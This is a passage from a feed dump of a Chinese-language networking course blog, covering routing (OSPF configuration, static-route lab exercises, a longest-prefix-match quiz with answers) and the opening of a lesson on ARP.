class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># å¯ç”¨OSPFï¼ˆè¿›ç¨‹å·100ï¼‰</span><br>Router(<span class="hljs-built_in">config</span>)<span class="hljs-comment"># router ospf 100</span><br><br><span class="hljs-comment"># è®¾ç½®Router ID</span><br>Router(<span class="hljs-built_in">config</span>-router)<span class="hljs-comment"># router-id 1.1.1.1</span><br><br><span class="hljs-comment"># é€šå‘Šç½‘ç»œï¼ˆç²¾ç¡®åŒ¹é…ï¼‰</span><br>Router(<span class="hljs-built_in">config</span>-router)<span class="hljs-comment"># network 192.168.1.0 0.0.0.255 area 0</span><br>Router(<span class="hljs-built_in">config</span>-router)<span class="hljs-comment"># network 192.168.2.0 0.0.0.255 area 1</span><br><br><span class="hljs-comment"># é…ç½®è¢«åŠ¨æ¥å£</span><br>Router(<span class="hljs-built_in">config</span>-router)<span class="hljs-comment"># passive-interface GigabitEthernet0/0</span><br><br><span class="hljs-comment"># ä¿®æ”¹Cost</span><br>Router(<span class="hljs-built_in">config</span>)<span class="hljs-comment"># interface GigabitEthernet0/1</span><br>Router(<span class="hljs-built_in">config</span>-if)<span class="hljs-comment"># ip ospf cost 10</span><br><br><span class="hljs-comment"># ä¿®æ”¹Helloé—´éš”</span><br>Router(<span class="hljs-built_in">config</span>-if)<span class="hljs-comment"># ip ospf hello-interval 5</span><br>Router(<span class="hljs-built_in">config</span>-if)<span class="hljs-comment"># ip ospf dead-interval 20</span><br><br><span class="hljs-comment"># æŸ¥çœ‹OSPFé‚»å±…</span><br>Router<span class="hljs-comment"># show ip ospf neighbor</span><br><br><span class="hljs-comment"># æŸ¥çœ‹OSPFæ•°æ®åº“</span><br>Router<span class="hljs-comment"># show ip ospf database</span><br><br><span class="hljs-comment"># æŸ¥çœ‹OSPFæ¥å£</span><br>Router<span class="hljs-comment"># show ip ospf interface</span><br><br><span class="hljs-comment"># æŸ¥çœ‹OSPFè·¯ç”±</span><br>Router<span class="hljs-comment"># show ip route ospf</span><br></code></pre></td></tr></table></figure><hr><h2 id="7-å®æˆ˜é¡¹ç›®ï¼šè·¯ç”±è¡¨æ¨¡æ‹Ÿå™¨"><a href="#7-å®æˆ˜é¡¹ç›®ï¼šè·¯ç”±è¡¨æ¨¡æ‹Ÿå™¨" class="headerlink" title="7. å®æˆ˜é¡¹ç›®ï¼šè·¯ç”±è¡¨æ¨¡æ‹Ÿå™¨"></a>7. å®æˆ˜é¡¹ç›®ï¼šè·¯ç”±è¡¨æ¨¡æ‹Ÿå™¨</h2><h3 id="7-1-é¡¹ç›®éœ€æ±‚"><a href="#7-1-é¡¹ç›®éœ€æ±‚" class="headerlink" title="7.1 é¡¹ç›®éœ€æ±‚"></a>7.1 é¡¹ç›®éœ€æ±‚</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs markdown">åŠŸèƒ½éœ€æ±‚ï¼š<br><span class="hljs-bullet">1.</span> è·¯ç”±è¡¨ç®¡ç†<br><span class="hljs-bullet">   -</span> æ·»åŠ /åˆ é™¤è·¯ç”±<br><span class="hljs-bullet">   -</span> æŸ¥çœ‹è·¯ç”±è¡¨<br><span class="hljs-bullet">   -</span> å¯¼å…¥/å¯¼å‡º<br><br><span class="hljs-bullet">2.</span> è·¯ç”±æŸ¥æ‰¾<br><span class="hljs-bullet">   -</span> æœ€é•¿å‰ç¼€åŒ¹é…<br><span class="hljs-bullet">   -</span> æŸ¥æ‰¾è·¯å¾„<br><span class="hljs-bullet">   -</span> æ€§èƒ½æµ‹è¯•<br><br><span class="hljs-bullet">3.</span> è·¯ç”±åè®®æ¨¡æ‹Ÿ<br><span class="hljs-bullet">   -</span> é™æ€è·¯ç”±<br><span class="hljs-bullet">   -</span> ç®€å•RIPæ¨¡æ‹Ÿ<br><span class="hljs-bullet">   -</span> è·¯ç”±æ”¶æ•›æ¼”ç¤º<br><br><span class="hljs-bullet">4.</span> å¯è§†åŒ–<br><span class="hljs-bullet">   -</span> è·¯ç”±è¡¨æ˜¾ç¤º<br><span class="hljs-bullet">   -</span> æŸ¥æ‰¾è¿‡ç¨‹å±•ç¤º<br><span class="hljs-bullet">   -</span> ç½‘ç»œæ‹“æ‰‘å›¾<br><br>æŠ€æœ¯è¦æ±‚ï¼š<br><span class="hljs-bullet">-</span> Pythonå®ç°<br><span class="hljs-bullet">-</span> æ”¯æŒIPv4/IPv6<br><span class="hljs-bullet">-</span> å‘½ä»¤è¡Œç•Œé¢<br><span class="hljs-bullet">-</span> å‹å¥½çš„è¾“å‡º<br></code></pre></td></tr></table></figure><h3 id="7-2-å·¥å…·æ¼”ç¤º"><a href="#7-2-å·¥å…·æ¼”ç¤º" class="headerlink" title="7.2 å·¥å…·æ¼”ç¤º"></a>7.2 å·¥å…·æ¼”ç¤º</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># è·¯ç”±è¡¨ç®¡ç†</span><br>python day26_routing_sim.py --add 192.168.2.0/24 --via 192.168.1.254<br>python day26_routing_sim.py --show<br><br><span class="hljs-comment"># è·¯ç”±æŸ¥æ‰¾</span><br>python day26_routing_sim.py --lookup 192.168.2.100<br><br><span class="hljs-comment"># RIPæ¨¡æ‹Ÿ</span><br>python day26_routing_sim.py --simulate-rip<br></code></pre></td></tr></table></figure><hr><h2 id="8-ä»Šæ—¥ç»ƒä¹ "><a href="#8-ä»Šæ—¥ç»ƒä¹ " class="headerlink" title="8. ä»Šæ—¥ç»ƒä¹ "></a>8. ä»Šæ—¥ç»ƒä¹ </h2><h3 id="ç»ƒä¹ 1ï¼šæŸ¥çœ‹æœ¬æœºè·¯ç”±è¡¨"><a href="#ç»ƒä¹ 1ï¼šæŸ¥çœ‹æœ¬æœºè·¯ç”±è¡¨" class="headerlink" title="ç»ƒä¹ 1ï¼šæŸ¥çœ‹æœ¬æœºè·¯ç”±è¡¨"></a>ç»ƒä¹ 1ï¼šæŸ¥çœ‹æœ¬æœºè·¯ç”±è¡¨</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> Linux/macOS:<br>   ip route show<br>   æˆ–<br>   netstat -rn<br><br>   åˆ†æï¼š<br><span class="hljs-bullet">   -</span> æœ‰å¤šå°‘æ¡è·¯ç”±ï¼Ÿ<br><span class="hljs-bullet">   -</span> é»˜è®¤ç½‘å…³æ˜¯ä»€ä¹ˆï¼Ÿ<br><span class="hljs-bullet">   -</span> æœ‰ç›´è¿è·¯ç”±å—ï¼Ÿ<br><br><span class="hljs-bullet">2.</span> Windows:<br>   route print<br><br>   åˆ†æï¼š<br><span class="hljs-bullet">   -</span> é»˜è®¤è·¯ç”±çš„åº¦é‡æ˜¯å¤šå°‘ï¼Ÿ<br><span class="hljs-bullet">   -</span> æœ‰å¤šä¸ªç½‘å¡å—ï¼Ÿ<br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 2ï¼šé™æ€è·¯ç”±å®éªŒ"><a href="#ç»ƒä¹ 2ï¼šé™æ€è·¯ç”±å®éªŒ" class="headerlink" title="ç»ƒä¹ 2ï¼šé™æ€è·¯ç”±å®éªŒ"></a>ç»ƒä¹ 2ï¼šé™æ€è·¯ç”±å®éªŒ</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs dns">è™šæ‹Ÿæœºå®éªŒï¼š<br><br>æ‹“æ‰‘ï¼š<br>VM1 (<span class="hljs-number">192.168.1.10</span>) â† â†’ VM2 (<span class="hljs-number">192.168.1.1</span>/<span class="hljs-number">192.168.2.1</span>) â† â†’ VM3 (<span class="hljs-number">192.168.2.10</span>)<br><br>æ­¥éª¤ï¼š<br><span class="hljs-number">1</span>. é…ç½®VM2ä¸ºè·¯ç”±å™¨ï¼ˆå¯ç”¨IPè½¬å‘ï¼‰<br>   sudo sysctl -w net.ipv4.ip_forward=<span class="hljs-number">1</span><br><br><span class="hljs-number">2</span>. VM1æ·»åŠ åˆ°<span class="hljs-number">192.168.2.0</span>/<span class="hljs-number">24</span>çš„è·¯ç”±<br>   sudo ip route add <span class="hljs-number">192.168.2.0</span>/<span class="hljs-number">24</span> via <span class="hljs-number">192.168.1.1</span><br><br><span class="hljs-number">3</span>. VM3æ·»åŠ åˆ°<span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span>çš„è·¯ç”±<br>   sudo ip route add <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span> via <span class="hljs-number">192.168.2.1</span><br><br><span class="hljs-number">4</span>. æµ‹è¯•è¿é€šæ€§<br>   ä»VM1 ping VM3<br><br><span class="hljs-number">5</span>. æŸ¥çœ‹æ•°æ®åŒ…è·¯å¾„<br>   tracerouteä»VM1åˆ°VM3<br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 3ï¼šè·¯ç”±æŸ¥æ‰¾ç»ƒä¹ "><a href="#ç»ƒä¹ 3ï¼šè·¯ç”±æŸ¥æ‰¾ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ 3ï¼šè·¯ç”±æŸ¥æ‰¾ç»ƒä¹ "></a>ç»ƒä¹ 3ï¼šè·¯ç”±æŸ¥æ‰¾ç»ƒä¹ </h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs dns">ç»™å®šè·¯ç”±è¡¨ï¼š<br><span class="hljs-number">1</span>. <span class="hljs-number">0.0.0.0</span>/<span class="hljs-number">0</span> via <span class="hljs-number">192.168.1.1</span><br><span class="hljs-number">2</span>. <span class="hljs-number">10.0.0.0</span>/<span class="hljs-number">8</span> via <span class="hljs-number">192.168.1.2</span><br><span class="hljs-number">3</span>. <span class="hljs-number">10.1.0.0</span>/<span class="hljs-number">16</span> via <span class="hljs-number">192.168.1.3</span><br><span class="hljs-number">4</span>. <span class="hljs-number">10.1.2.0</span>/<span class="hljs-number">24</span> via <span class="hljs-number">192.168.1.4</span><br><span class="hljs-number">5</span>. <span class="hljs-number">192.168.0.0</span>/<span class="hljs-number">16</span> via <span class="hljs-number">192.168.1.5</span><br><br>æŸ¥æ‰¾ä»¥ä¸‹ç›®æ ‡IPçš„è·¯ç”±ï¼š<br><span class="hljs-number">1</span>. <span class="hljs-number">10.1.2.100</span> â†’ ?<br><span class="hljs-number">2</span>. <span class="hljs-number">10.1.3.100</span> â†’ ?<br><span class="hljs-number">3</span>. <span class="hljs-number">10.2.1.100</span> â†’ ?<br><span class="hljs-number">4</span>. <span class="hljs-number">192.168.100.1</span> â†’ ?<br><span class="hljs-number">5</span>. <span class="hljs-number">8.8.8.8</span> â†’ ?<br><br>ï¼ˆç­”æ¡ˆè§æ–‡æœ«ï¼‰<br></code></pre></td></tr></table></figure><hr><h2 id="9-å¸¸è§é—®é¢˜"><a href="#9-å¸¸è§é—®é¢˜" class="headerlink" title="9. å¸¸è§é—®é¢˜"></a>9. å¸¸è§é—®é¢˜</h2><p><strong>Q1ï¼šé™æ€è·¯ç”±å’ŒåŠ¨æ€è·¯ç”±èƒ½åŒæ—¶ä½¿ç”¨å—ï¼Ÿ</strong></p><p>Aï¼š<br>å¯ä»¥ï¼å®é™…ç½‘ç»œå¸¸å¸¸æ··åˆä½¿ç”¨</p><ul><li>é»˜è®¤è·¯ç”±ï¼šé™æ€</li><li>å†…éƒ¨ç½‘ç»œï¼šåŠ¨æ€ï¼ˆOSPFï¼‰</li><li>ç‰¹å®šè·¯ç”±ï¼šé™æ€</li></ul><p>ç®¡ç†è·ç¦»å†³å®šä¼˜å…ˆçº§ï¼š</p><ul><li>ç›´è¿ï¼š0</li><li>é™æ€ï¼š1</li><li>OSPFï¼š110</li><li>RIPï¼š120</li></ul><p><strong>Q2ï¼šè·¯ç”±ç¯è·¯æ€ä¹ˆæ£€æµ‹ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>TTLï¼šæ¯ç»è¿‡è·¯ç”±å™¨å‡1ï¼Œä¸º0ä¸¢å¼ƒ</li><li>Tracerouteï¼šæ˜¾ç¤ºè·¯å¾„ï¼Œå¯è§ç¯è·¯</li><li>è·¯ç”±åè®®é˜²ç¯æœºåˆ¶</li></ul><p><strong>Q3ï¼šä¸ºä»€ä¹ˆéœ€è¦é»˜è®¤è·¯ç”±ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>ä¸å¯èƒ½é…ç½®æ‰€æœ‰è·¯ç”±</li><li>äº’è”ç½‘ä¸Šå‡ åä¸‡æ¡è·¯ç”±</li><li>é»˜è®¤è·¯ç”±ï¼šåŒ¹é…æ‰€æœ‰</li><li>é€šå¸¸æŒ‡å‘ISP</li></ul><p><strong>Q4ï¼šRIPå’ŒOSPFå¦‚ä½•é€‰æ‹©ï¼Ÿ</strong></p><p>Aï¼š<br>å°å‹ç½‘ç»œï¼ˆ&lt;15è·³ï¼‰ï¼šRIP</p><ul><li>é…ç½®ç®€å•</li><li>èµ„æºå ç”¨ä½</li></ul><p>å¤§å‹ç½‘ç»œï¼šOSPF</p><ul><li>å¿«é€Ÿæ”¶æ•›</li><li>æ— è·³æ•°é™åˆ¶</li><li>æ›´ç²¾ç¡®</li></ul><p><strong>Q5ï¼šä»€ä¹ˆæ˜¯ç®¡ç†è·ç¦»ï¼Ÿ</strong></p><p>Aï¼š<br>ç®¡ç†è·ç¦»ï¼ˆADï¼‰&#x3D; è·¯ç”±ä¿¡æ¯çš„å¯ä¿¡åº¦</p><ul><li>å€¼è¶Šå°è¶Šå¯ä¿¡</li><li>ç”¨äºé€‰æ‹©è·¯ç”±æ¥æº</li></ul><p>å¸¸è§ADï¼š</p><ul><li>ç›´è¿ï¼š0</li><li>é™æ€ï¼š1</li><li>EIGRPï¼š90</li><li>OSPFï¼š110</li><li>RIPï¼š120</li><li>å¤–éƒ¨ï¼š255ï¼ˆä¸å¯ä¿¡ï¼‰</li></ul><hr><h2 id="10-æ€»ç»“"><a href="#10-æ€»ç»“" class="headerlink" title="10. æ€»ç»“"></a>10. æ€»ç»“</h2><p>ä»Šå¤©æˆ‘ä»¬å­¦ä¹ äº†ï¼š</p><h3 id="æ ¸å¿ƒçŸ¥è¯†ç‚¹"><a href="#æ ¸å¿ƒçŸ¥è¯†ç‚¹" class="headerlink" title="æ ¸å¿ƒçŸ¥è¯†ç‚¹"></a>æ ¸å¿ƒçŸ¥è¯†ç‚¹</h3><ol><li><p><strong>è·¯ç”±åŸºç¡€</strong>ï¼š</p><ul><li>è·¯ç”±çš„ä½œç”¨å’ŒåŸç†</li><li>ç›´è¿è·¯ç”±vsé—´æ¥è·¯ç”±</li><li>ä¸‹ä¸€è·³æ¦‚å¿µ</li></ul></li><li><p><strong>è·¯ç”±è¡¨</strong>ï¼š</p><ul><li>è·¯ç”±è¡¨ç»“æ„</li><li>æœ€é•¿å‰ç¼€åŒ¹é…</li><li>è·¯ç”±æŸ¥æ‰¾è¿‡ç¨‹</li></ul></li><li><p><strong>é™æ€è·¯ç”±</strong>ï¼š</p><ul><li>é…ç½®æ–¹æ³•</li><li>ä¼˜ç¼ºç‚¹</li><li>ä½¿ç”¨åœºæ™¯</li></ul></li><li><p><strong>åŠ¨æ€è·¯ç”±åˆ†ç±»</strong>ï¼š</p><ul><li>IGP vs EGP</li><li>è·ç¦»çŸ¢é‡ vs é“¾è·¯çŠ¶æ€</li><li>è·¯ç”±åº¦é‡</li></ul></li><li><p><strong>RIPåè®®</strong>ï¼š</p><ul><li>è·ç¦»çŸ¢é‡åè®®</li><li>è·³æ•°åº¦é‡</li><li>é˜²ç¯æœºåˆ¶</li><li>é…ç½®æ–¹æ³•</li></ul></li><li><p><strong>OSPFåŸºç¡€</strong>ï¼š</p><ul><li>é“¾è·¯çŠ¶æ€åè®®</li><li>åŒºåŸŸè®¾è®¡</li><li>é‚»å±…å…³ç³»</li><li>å¿«é€Ÿæ”¶æ•›</li></ul></li></ol><h3 id="é‡ç‚¹å›é¡¾"><a href="#é‡ç‚¹å›é¡¾" class="headerlink" title="é‡ç‚¹å›é¡¾"></a>é‡ç‚¹å›é¡¾</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">è·¯ç”±æŸ¥æ‰¾ï¼š<br>æœ€é•¿å‰ç¼€åŒ¹é… â†’ ä¸»æœºè·¯ç”±ä¼˜å…ˆ â†’ ç½‘ç»œè·¯ç”± â†’ é»˜è®¤è·¯ç”±<br><br>åŠ¨æ€è·¯ç”±åˆ†ç±»ï¼š<br>è·ç¦»çŸ¢é‡ï¼ˆRIPï¼‰ï¼šç®€å•ï¼Œæ…¢ï¼Œé€‚åˆå°ç½‘ç»œ<br>é“¾è·¯çŠ¶æ€ï¼ˆOSPFï¼‰ï¼šå¤æ‚ï¼Œå¿«ï¼Œé€‚åˆå¤§ç½‘ç»œ<br><br>RIPé˜²ç¯ï¼š<br><span class="hljs-bullet">- </span>æœ€å¤§è·³æ•°ï¼ˆ15ï¼‰<br><span class="hljs-bullet">- </span>æ°´å¹³åˆ†å‰²<br><span class="hljs-bullet">- </span>æ¯’æ€§é€†è½¬<br><span class="hljs-bullet">- </span>æŠ‘åˆ¶å®šæ—¶å™¨<br><span class="hljs-bullet">- </span>è§¦å‘æ›´æ–°<br><br>OSPFç‰¹ç‚¹ï¼š<br><span class="hljs-bullet">- </span>å¿«é€Ÿæ”¶æ•›<br><span class="hljs-bullet">- </span>åŒºåŸŸè®¾è®¡<br><span class="hljs-bullet">- </span>Coståº¦é‡<br><span class="hljs-bullet">- </span>LSAæ³›æ´ª<br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 3ç­”æ¡ˆ"><a href="#ç»ƒä¹ 3ç­”æ¡ˆ" class="headerlink" title="ç»ƒä¹ 3ç­”æ¡ˆ"></a>ç»ƒä¹ 3ç­”æ¡ˆ</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>. <span class="hljs-number">10.1.2.100</span> â†’ via <span class="hljs-number">192.168.1.4</span>ï¼ˆ/<span class="hljs-number">24</span>æœ€é•¿ï¼‰<br><span class="hljs-attribute">2</span>. <span class="hljs-number">10.1.3.100</span> â†’ via <span class="hljs-number">192.168.1.3</span>ï¼ˆ/<span class="hljs-number">16</span>ï¼‰<br><span class="hljs-attribute">3</span>. <span class="hljs-number">10.2.1.100</span> â†’ via <span class="hljs-number">192.168.1.2</span>ï¼ˆ/<span class="hljs-number">8</span>ï¼‰<br><span class="hljs-attribute">4</span>. <span class="hljs-number">192.168.100.1</span> â†’ via <span class="hljs-number">192.168.1.5</span>ï¼ˆ/<span class="hljs-number">16</span>ï¼‰<br><span class="hljs-attribute">5</span>. <span class="hljs-number">8.8.8.8</span> â†’ via <span class="hljs-number">192.168.1.1</span>ï¼ˆé»˜è®¤è·¯ç”±ï¼‰<br></code></pre></td></tr></table></figure><h3 id="æ˜å¤©é¢„å‘Š"><a href="#æ˜å¤©é¢„å‘Š" class="headerlink" title="æ˜å¤©é¢„å‘Š"></a>æ˜å¤©é¢„å‘Š</h3><p><strong>ç¬¬27å¤©ï¼šç¬¬å››å‘¨ç»¼åˆå®æˆ˜</strong></p><p>å†…å®¹é¢„è§ˆï¼š</p><ul><li>ç½‘ç»œå±‚çŸ¥è¯†å›é¡¾</li><li>ç»¼åˆå®æˆ˜é¡¹ç›®</li><li>ç½‘ç»œæ’é”™æ¡ˆä¾‹</li><li>æ€§èƒ½ä¼˜åŒ–</li><li>å‘¨æ€»ç»“</li></ul><hr><p><strong>ç»§ç»­åŠ æ²¹ï¼</strong> ğŸš€</p><p>ä»Šå¤©æˆ‘ä»¬æ·±å…¥å­¦ä¹ äº†è·¯ç”±åè®®ï¼Œç†è§£äº†ç½‘ç»œå±‚æœ€æ ¸å¿ƒçš„æ¦‚å¿µä¹‹ä¸€ã€‚ä»é™æ€è·¯ç”±åˆ°åŠ¨æ€è·¯ç”±ï¼Œä»RIPåˆ°OSPFï¼Œè¿™äº›éƒ½æ˜¯ç½‘ç»œå·¥ç¨‹å¸ˆå¿…å¤‡çš„çŸ¥è¯†ã€‚æ˜å¤©æˆ‘ä»¬å°†è¿›è¡Œç¬¬å››å‘¨çš„ç»¼åˆå®æˆ˜ï¼Œå·©å›ºæœ¬å‘¨æ‰€å­¦ï¼</p><p><strong>è¿›åº¦ï¼š26&#x2F;180å¤©ï¼ˆ14.4%ï¼‰</strong></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>25å¤©ï¼šARPåè®®å’Œé“¾è·¯å±‚</title>
    <link href="/2025/11/10/25%E5%A4%A9%EF%BC%9AARP%E5%8D%8F%E8%AE%AE%E5%92%8C%E9%93%BE%E8%B7%AF%E5%B1%82/"/>
    <url>/2025/11/10/25%E5%A4%A9%EF%BC%9AARP%E5%8D%8F%E8%AE%AE%E5%92%8C%E9%93%BE%E8%B7%AF%E5%B1%82/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬25å¤©ï¼šARPåè®®å’Œé“¾è·¯å±‚"><a href="#ç¬¬25å¤©ï¼šARPåè®®å’Œé“¾è·¯å±‚" class="headerlink" title="ç¬¬25å¤©ï¼šARPåè®®å’Œé“¾è·¯å±‚"></a>ç¬¬25å¤©ï¼šARPåè®®å’Œé“¾è·¯å±‚</h1><h2 id="ä»Šæ—¥ç›®æ ‡"><a href="#ä»Šæ—¥ç›®æ ‡" class="headerlink" title="ä»Šæ—¥ç›®æ ‡"></a>ä»Šæ—¥ç›®æ ‡</h2><ul><li>ç†è§£ARPåè®®çš„ä½œç”¨å’Œå·¥ä½œåŸç†</li><li>æŒæ¡ARPç¼“å­˜ç®¡ç†</li><li>å­¦ä¹ å…è´¹ARPå’Œä»£ç†ARP</li><li>äº†è§£ARPå®‰å…¨é—®é¢˜å’Œé˜²å¾¡æªæ–½</li><li>ç†è§£MACåœ°å€å’Œä»¥å¤ªç½‘å¸§æ ¼å¼</li><li>å­¦ä¹ VLANåŸºç¡€</li><li>å®ç°ARPå·¥å…·</li></ul><hr><h2 id="1-ARPåè®®æ¦‚è¿°"><a href="#1-ARPåè®®æ¦‚è¿°" class="headerlink" title="1. ARPåè®®æ¦‚è¿°"></a>1. ARPåè®®æ¦‚è¿°</h2><h3 id="1-1-ä»€ä¹ˆæ˜¯ARPï¼Ÿ"><a href="#1-1-ä»€ä¹ˆæ˜¯ARPï¼Ÿ" class="headerlink" title="1.1 ä»€ä¹ˆæ˜¯ARPï¼Ÿ"></a>1.1 ä»€ä¹ˆæ˜¯ARPï¼Ÿ</h3><p><strong>ARP &#x3D; Address Resolution Protocolï¼ˆåœ°å€è§£æåè®®ï¼‰</strong></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs stata">ARPçš„ä½œç”¨ï¼š<br>å°†IPåœ°å€æ˜ å°„åˆ°<span class="hljs-keyword">MAC</span>åœ°å€<br><br>ä¸ºä»€ä¹ˆéœ€è¦ARPï¼Ÿ<br>- ç½‘ç»œå±‚ä½¿ç”¨IPåœ°å€é€šä¿¡<br>- æ•°æ®é“¾è·¯å±‚ä½¿ç”¨<span class="hljs-keyword">MAC</span>åœ°å€é€šä¿¡<br>- éœ€è¦å°†IPåœ°å€è½¬æ¢ä¸º<span class="hljs-keyword">MAC</span>åœ°å€<br><br>ç”Ÿæ´»æ¯”å–»ï¼š<br>IPåœ°å€åƒå®¶åº­ä½å€ï¼š<span class="hljs-string">&quot;åŒ—äº¬å¸‚æœé˜³åŒºæŸæŸè¡—123å·&quot;</span><br><span class="hljs-keyword">MAC</span>åœ°å€åƒé—¨ç‰Œå·ç ï¼š<span class="hljs-string">&quot;1å·æ¥¼2å•å…ƒ301å®¤&quot;</span><br><br>å¿«é€’å‘˜ï¼ˆæ•°æ®åŒ…ï¼‰éœ€è¦ï¼š<br>1. å…ˆæ‰¾åˆ°è¡—é“ï¼ˆIPè·¯ç”±ï¼‰<br>2. å†æ‰¾åˆ°å…·ä½“é—¨ç‰Œï¼ˆ<span class="hljs-keyword">MAC</span>åœ°å€ï¼‰<br><br>ARPå°±æ˜¯<span class="hljs-string">&quot;æŸ¥è¯¢é—¨ç‰Œå·çš„è¿‡ç¨‹&quot;</span><br><br>å·¥ä½œåœºæ™¯ï¼š<br>ä¸»æœºAï¼ˆ192.168.1.10ï¼‰æƒ³å‘é€æ•°æ®ç»™ä¸»æœºBï¼ˆ192.168.1.20ï¼‰<br>â†’ AçŸ¥é“Bçš„IPåœ°å€ï¼ˆ192.168.1.20ï¼‰<br>â†’ Aä¸çŸ¥é“Bçš„<span class="hljs-keyword">MAC</span>åœ°å€<br>â†’ Aä½¿ç”¨ARPæŸ¥è¯¢ï¼š<span class="hljs-string">&quot;è°æ˜¯192.168.1.20ï¼Ÿ&quot;</span><br>â†’ Bå›å¤ï¼š<span class="hljs-string">&quot;æˆ‘æ˜¯ï¼Œæˆ‘çš„MACåœ°å€æ˜¯aa:bb:cc:dd:ee:ff&quot;</span><br>â†’ Aè®°å½•ä¸‹æ¥ï¼Œç„¶åå‘é€æ•°æ®<br></code></pre></td></tr></table></figure><p><strong>ARPçš„ç‰¹ç‚¹</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">âœ… å·¥ä½œåœ¨æ•°æ®é“¾è·¯å±‚å’Œç½‘ç»œå±‚ä¹‹é—´<br>âœ… åªåœ¨å±€åŸŸç½‘å†…å·¥ä½œï¼ˆä¸è·¨è·¯ç”±å™¨ï¼‰<br>âœ… ä½¿ç”¨å¹¿æ’­æŸ¥è¯¢<br>âœ… 